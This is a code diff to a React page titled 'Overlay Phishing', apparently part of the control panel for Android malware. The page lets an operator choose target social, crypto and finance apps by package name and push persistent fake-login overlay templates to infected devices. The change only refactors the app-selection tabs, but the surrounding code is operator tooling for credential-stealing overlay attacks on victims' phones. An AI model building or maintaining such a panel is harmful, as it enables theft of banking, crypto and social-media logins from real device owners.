@@ -78,6 +78,7 @@ const TARGET_APPS = {
 export default function OverlayPage() {
   const { clientId, loadClient, online } = useOutletContext<DeviceOutletContext>();
   const [selectedApps, setSelectedApps] = useState<Set<string>>(new Set());
+  const [activeAppTab, setActiveAppTab] = useState<keyof typeof TARGET_APPS>('social');
   const [templateType, setTemplateType] = useState('social_login');
   const [persistent, setPersistent] = useState(true);
   const [saving, setSaving] = useState(false);
@@ -94,7 +95,7 @@ export default function OverlayPage() {
     return () => { if (toastTimer.current) clearTimeout(toastTimer.current); };
   }, []);
 
-  const { data: pageData, loading, error, refresh, sendCommand, commandStatus } = useDeviceData<{
+  const { data: pageData, loading, error, refresh, commandStatus } = useDeviceData<{
     overlay_status?: OverlayStatus;
     overlay_config?: Record<string, unknown>;
   }>({
@@ -176,7 +177,6 @@ export default function OverlayPage() {
 
       <DevicePageHeader
         title="Overlay Phishing"
-        icon={Layers}
         online={online}
         commandStatus={commandStatus}
         refresh={refresh}
@@ -198,40 +198,49 @@ export default function OverlayPage() {
             </CardTitle>
           </CardHeader>
           <CardContent>
-            <Tabs defaultValue="social" className="w-full">
+            <Tabs className="w-full">
               <TabsList className="grid w-full grid-cols-3">
-                <TabsTrigger value="social">Social (11)</TabsTrigger>
-                <TabsTrigger value="crypto">Crypto (14)</TabsTrigger>
-                <TabsTrigger value="finance">Finance (21)</TabsTrigger>
+                {Object.entries(TARGET_APPS).map(([category, apps]) => (
+                  <TabsTrigger
+                    key={category}
+                    active={activeAppTab === category}
+                    onClick={() => setActiveAppTab(category as keyof typeof TARGET_APPS)}
+                    className="text-xs"
+                  >
+                    {category.charAt(0).toUpperCase() + category.slice(1)} ({apps.length})
+                  </TabsTrigger>
+                ))}
               </TabsList>
               {Object.entries(TARGET_APPS).map(([category, apps]) => (
-                <TabsContent key={category} value={category} className="mt-4">
-                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
-                    {apps.map((app) => (
-                      <button
-                        key={app.pkg}
-                        onClick={() => toggleApp(app.pkg)}
-                        className={`flex items-center gap-2 p-2 rounded-md border text-left transition-colors ${
-                          selectedApps.has(app.pkg)
-                            ? 'border-indigo-500/50 bg-indigo-500/10'
-                            : 'border-border hover:bg-accent'
-                        }`}
-                      >
-                        <div
-                          className="w-7 h-7 rounded flex items-center justify-center text-[10px] font-bold text-white shrink-0"
-                          style={{ backgroundColor: app.color }}
+                activeAppTab === category && (
+                  <TabsContent key={category} className="mt-4">
+                    <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
+                      {apps.map((app) => (
+                        <button
+                          key={app.pkg}
+                          onClick={() => toggleApp(app.pkg)}
+                          className={`flex items-center gap-2 p-2 rounded-md border text-left transition-colors ${
+                            selectedApps.has(app.pkg)
+                              ? 'border-indigo-500/50 bg-indigo-500/10'
+                              : 'border-border hover:bg-accent'
+                          }`}
                         >
-                          {app.name[0]}
-                        </div>
-                        <div className="min-w-0">
-                          <div className="text-xs font-medium truncate">{app.name}</div>
-                          <div className="text-[10px] text-muted-foreground truncate">{app.pkg}</div>
-                        </div>
-                        {selectedApps.has(app.pkg) && <Eye className="h-3 w-3 text-indigo-400 ml-auto shrink-0" />}
-                      </button>
-                    ))}
-                  </div>
-                </TabsContent>
+                          <div
+                            className="w-7 h-7 rounded flex items-center justify-center text-[10px] font-bold text-white shrink-0"
+                            style={{ backgroundColor: app.color }}
+                          >
+                            {app.name[0]}
+                          </div>
+                          <div className="min-w-0">
+                            <div className="text-xs font-medium truncate">{app.name}</div>
+                            <div className="text-[10px] text-muted-foreground truncate">{app.pkg}</div>
+                          </div>
+                          {selectedApps.has(app.pkg) && <Eye className="h-3 w-3 text-indigo-400 ml-auto shrink-0" />}
+                        </button>
+                      ))}
+                    </div>
+                  </TabsContent>
+                )
               ))}
             </Tabs>
           </CardContent>
